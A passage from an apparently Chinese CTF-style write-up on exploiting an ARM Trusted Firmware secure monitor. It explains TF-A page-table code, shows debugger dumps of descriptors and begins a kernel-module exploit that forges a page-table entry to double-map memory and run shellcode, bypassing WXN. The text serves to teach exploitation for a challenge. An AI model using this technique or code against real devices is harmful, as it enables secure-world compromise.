</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint64_t</span> <span class="nf">xlat_arch_get_xn_desc</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">el</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">el</span> <span class="o">==</span> <span class="mi">3U</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nf">UPPER_ATTRS</span><span class="p">(</span><span class="n">XN</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">assert</span><span class="p">(</span><span class="n">el</span> <span class="o">==</span> <span class="mi">1U</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nf">UPPER_ATTRS</span><span class="p">(</span><span class="n">PXN</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="c1">// include\lib\xlat_tables\xlat_tables_defs.h
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cm">/* XN: Translation regimes that support one VA range (EL2 and EL3). */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define XN			(ULL(1) &lt;&lt; 2)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/* UXN, PXN: Translation regimes that support two VA ranges (EL1&amp;0). */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define UXN			(ULL(1) &lt;&lt; 2)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PXN			(ULL(1) &lt;&lt; 1)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define UPPER_ATTRS(x)		(((x) &amp; ULL(0x7)) &lt;&lt; 52)</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>解决方法也是参考<a href="https://blog.impalabs.com/2212_advisory_huawei-secure-monitor.html#double-mapping-the-secure-monitor">Double Mapping the Secure Monitor</a>，伪造页表项，将代码段重复映射成<code>RWN</code>权限，用该映射写入shellcode，用原来的映射执行shellcode：</p>
<blockquote>
<p>To bypass the WXN mechanism, we decided to target the page table and map the secure monitor a second time, as read-write. This way, we are able to change the secure monitor&rsquo;s code from the writable mapping and have the changes mirrored in the executable one.</p></blockquote>
<p>页表项寻址相关源码如下：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// include\lib\xlat_tables\xlat_tables_defs.h
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Extract from the given virtual address the index into the given lookup level.
</span></span></span><span class="line"><span class="cl"><span class="cm"> * This macro assumes the system is using the 4KB translation granule.
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define XLAT_TABLE_IDX(virtual_addr, level)	\
</span></span></span><span class="line"><span class="cl"><span class="cp">	(((virtual_addr) &gt;&gt; XLAT_ADDR_SHIFT(level)) &amp; ULL(0x1FF))
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// lib\xlat_tables_v2\xlat_tables_utils.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Do a translation table walk to find the block or page descriptor that maps
</span></span></span><span class="line"><span class="cl"><span class="cm"> * virtual_addr.
</span></span></span><span class="line"><span class="cl"><span class="cm"> *
</span></span></span><span class="line"><span class="cl"><span class="cm"> * On success, return the address of the descriptor within the translation
</span></span></span><span class="line"><span class="cl"><span class="cm"> * table. Its lookup level is stored in &#39;*out_level&#39;.
</span></span></span><span class="line"><span class="cl"><span class="cm"> * On error, return NULL.
</span></span></span><span class="line"><span class="cl"><span class="cm"> *
</span></span></span><span class="line"><span class="cl"><span class="cm"> * xlat_table_base
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   Base address for the initial lookup level.
</span></span></span><span class="line"><span class="cl"><span class="cm"> * xlat_table_base_entries
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   Number of entries in the translation table for the initial lookup level.
</span></span></span><span class="line"><span class="cl"><span class="cm"> * virt_addr_space_size
</span></span></span><span class="line"><span class="cl"><span class="cm"> *   Size in bytes of the virtual address space.
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="nf">find_xlat_table_entry</span><span class="p">(</span><span class="kt">uintptr_t</span> <span class="n">virtual_addr</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				       <span class="kt">void</span> <span class="o">*</span><span class="n">xlat_table_base</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				       <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">xlat_table_base_entries</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				       <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">virt_addr_space_size</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				       <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">out_level</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">start_level</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">uint64_t</span> <span class="o">*</span><span class="n">table</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">entries</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">start_level</span> <span class="o">=</span> <span class="nf">GET_XLAT_TABLE_LEVEL_BASE</span><span class="p">(</span><span class="n">virt_addr_space_size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">table</span> <span class="o">=</span> <span class="n">xlat_table_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">entries</span> <span class="o">=</span> <span class="n">xlat_table_base_entries</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">level</span> <span class="o">=</span> <span class="n">start_level</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	     <span class="n">level</span> <span class="o">&lt;=</span> <span class="n">XLAT_TABLE_LEVEL_MAX</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	     <span class="o">++</span><span class="n">level</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span> <span class="n">desc</span><span class="p">,</span> <span class="n">desc_type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">idx</span> <span class="o">=</span> <span class="nf">XLAT_TABLE_IDX</span><span class="p">(</span><span class="n">virtual_addr</span><span class="p">,</span> <span class="n">level</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">idx</span> <span class="o">&gt;=</span> <span class="n">entries</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">WARN</span><span class="p">(</span><span class="s">&#34;Missing xlat table entry at address 0x%lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			     <span class="n">virtual_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">desc</span> <span class="o">=</span> <span class="n">table</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="n">desc_type</span> <span class="o">=</span> <span class="n">desc</span> <span class="o">&amp;</span> <span class="n">DESC_MASK</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">desc_type</span> <span class="o">==</span> <span class="n">INVALID_DESC</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nf">VERBOSE</span><span class="p">(</span><span class="s">&#34;Invalid entry (memory not mapped)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">level</span> <span class="o">==</span> <span class="n">XLAT_TABLE_LEVEL_MAX</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * Only page descriptors allowed at the final lookup
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * level.
</span></span></span><span class="line"><span class="cl"><span class="cm">			 */</span>
</span></span><span class="line"><span class="cl">			<span class="nf">assert</span><span class="p">(</span><span class="n">desc_type</span> <span class="o">==</span> <span class="n">PAGE_DESC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="o">*</span><span class="n">out_level</span> <span class="o">=</span> <span class="n">level</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="o">&amp;</span><span class="n">table</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">desc_type</span> <span class="o">==</span> <span class="n">BLOCK_DESC</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="o">*</span><span class="n">out_level</span> <span class="o">=</span> <span class="n">level</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="o">&amp;</span><span class="n">table</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nf">assert</span><span class="p">(</span><span class="n">desc_type</span> <span class="o">==</span> <span class="n">TABLE_DESC</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">table</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="kt">uintptr_t</span><span class="p">)(</span><span class="n">desc</span> <span class="o">&amp;</span> <span class="n">TABLE_ADDR_MASK</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">entries</span> <span class="o">=</span> <span class="n">XLAT_TABLE_ENTRIES</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * This shouldn&#39;t be reached, the translation table walk should end at
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * most at level XLAT_TABLE_LEVEL_MAX and return from inside the loop.
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="nf">assert</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>页表项含义如下：</p>
<ul>
<li>0~1 bit：标识desk类型，三级页表为<code>PAGE_DESC(3)</code></li>
<li>52~54 bit：标识可执行权限，不可执行为<code>XN(4)</code></li>
</ul>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define INVALID_DESC		U(0x0)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * A block descriptor points to a region of memory bigger than the granule size
</span></span></span><span class="line"><span class="cl"><span class="cm"> * (e.g. a 2MB region when the granule size is 4KB).
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define BLOCK_DESC		U(0x1) </span><span class="cm">/* Table levels 0-2 */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/* A table descriptor points to the next level of translation table. */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define TABLE_DESC		U(0x3) </span><span class="cm">/* Table levels 0-2 */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"> * A page descriptor points to a page, i.e. a memory region whose size is the
</span></span></span><span class="line"><span class="cl"><span class="cm"> * translation granule size (e.g. 4KB).
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_DESC		U(0x3) </span><span class="cm">/* Table level 3 */</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define DESC_MASK		U(0x3)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define FIRST_LEVEL_DESC_N	ONE_GB_SHIFT
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SECOND_LEVEL_DESC_N	TWO_MB_SHIFT
</span></span></span><span class="line"><span class="cl"><span class="cp">#define THIRD_LEVEL_DESC_N	FOUR_KB_SHIFT
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XN: Translation regimes that support one VA range (EL2 and EL3). */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define XN			(ULL(1) &lt;&lt; 2)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="cm">/* UXN, PXN: Translation regimes that support two VA ranges (EL1&amp;0). */</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define UXN			(ULL(1) &lt;&lt; 2)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PXN			(ULL(1) &lt;&lt; 1)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define CONT_HINT		(ULL(1) &lt;&lt; 0)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define UPPER_ATTRS(x)		(((x) &amp; ULL(0x7)) &lt;&lt; 52)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define NON_GLOBAL		(U(1) &lt;&lt; 9)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ACCESS_FLAG		(U(1) &lt;&lt; 8)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define NSH			(U(0x0) &lt;&lt; 6)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define OSH			(U(0x2) &lt;&lt; 6)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define ISH			(U(0x3) &lt;&lt; 6)</span></span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>为了避免复杂的计算找到页表位置，我们可以调用<code>STORAGE_SVC_RD</code>在<code>0xE0A6678</code>（<code>find_xlat_table_entry</code>返回处）下断点查看，返回值<code>x0</code>即页表项所在地址。这里调用<code>    arm_smccc_smc(STORAGE_SVC_RD, 0xf, 0xE0DB000, 0x60, 0, 0, 0, 0, &amp;res);</code>得到<code>0xE0DB000</code>的页表项地址为<code>0xe0d96d8</code>，最大映射到<code>0xe0dd000</code>这一页，向上回溯可以看到<code>0xe0a0000 ~ 0xe0aafff</code>为可执行页：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>bash</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; x /32gx 0xe0d96d8
</span></span><span class="line"><span class="cl">0xe0d96d8:	0x004000000e0db743	0x004000000e0dc743
</span></span><span class="line"><span class="cl">0xe0d96e8:	0x004000000e0dd743	0x0000000000000000
</span></span><span class="line"><span class="cl">0xe0d96f8:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0xe0d9708:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">pwndbg&gt; x /32gx 0xe0d96f0-0x200
</span></span><span class="line"><span class="cl">0xe0d94f0:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0xe0d9500:	0x000000000e0a07c3	0x000000000e0a17c3
</span></span><span class="line"><span class="cl">0xe0d9510:	0x000000000e0a27c3	0x000000000e0a37c3
</span></span><span class="line"><span class="cl">0xe0d9520:	0x000000000e0a47c3	0x000000000e0a57c3
</span></span><span class="line"><span class="cl">0xe0d9530:	0x000000000e0a67c3	0x000000000e0a77c3
</span></span><span class="line"><span class="cl">0xe0d9540:	0x000000000e0a87c3	0x000000000e0a97c3
</span></span><span class="line"><span class="cl">0xe0d9550:	0x000000000e0aa7c3	0x004000000e0ab7c3
</span></span><span class="line"><span class="cl">0xe0d9560:	0x004000000e0ac7c3	0x004000000e0ad743
</span></span><span class="line"><span class="cl">...</span></span></code></pre></td></tr></table>
</div>
</div>
    </div>
</div>

<script>
function toggleCode(element) {
    const codeContent = element.nextElementSibling;
    if (codeContent.style.display === "none" || codeContent.style.display === "") {
        codeContent.style.display = "block"; 
        codeContent.parentNode.classList.remove("code-has-hidden-child");
    } else {
        codeContent.style.display = "none"; 
        codeContent.parentNode.classList.add("code-has-hidden-child");
    }
}
</script><p>有两个选项，一是将可执行页重复映射为可写，二是将可写页重复映射为可执行。这里选择将<code>0xe0db000</code>重复映射到<code>0xe0de000</code>并添加可执行权限，表项写入<code>0xe0d96f0</code>处，之后将官方README给的shellcode改吧改吧，编译后写入<code>0xe0db000</code>，再跳转到<code>0xe0de000</code>执行即可：</p>
<div class="code-block">
    <div class="code-title" onclick="toggleCode(this)">
        
        <span class="code-block-open"><ion-icon name="chevron-down-outline"></ion-icon></span>
        <span class="code-block-close"><ion-icon name="chevron-forward-outline"></ion-icon></ion-icon></span>
        <span>c</span>
    </div>
    <div class="code-content">
        
        <div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define LOG_SVC_ABWR       LOG_SMC_FID(2)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_SVC_SC         LOG_SMC_FID(3)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define BL31_NS_MEM       0x423dc000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define MAX_SIZE_ADDR     0xE0D70B0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define MEMCPY_ADDR       0xE0A3160
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define FAKE_DESC_ADDR    0xe0d96f0
</span></span></span><span class="line"><span class="cl"><span class="cp">#define FAKE_DESC         0xe0db7c3
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SC_RW_ADDR        0xe0db000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define SC_EXEC_ADDR      0xe0de000
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">step2_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">inode</span> <span class="o">*</span><span class="n">inode</span><span class="p">,</span> <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pr_info</span><span class="p">(</span><span class="s">&#34;Step2: Device opened</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">arm_smccc_res</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ns_mem</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ns_mem</span> <span class="o">=</span> <span class="nf">phys_to_virt</span><span class="p">(</span><span class="n">BL31_NS_MEM</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">ns_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="n">MEMCPY_ADDR</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ns_mem</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="n">SC_EXEC_ADDR</span><span class="p">;</span> <span class="c1">// 伪造的可执行页地址
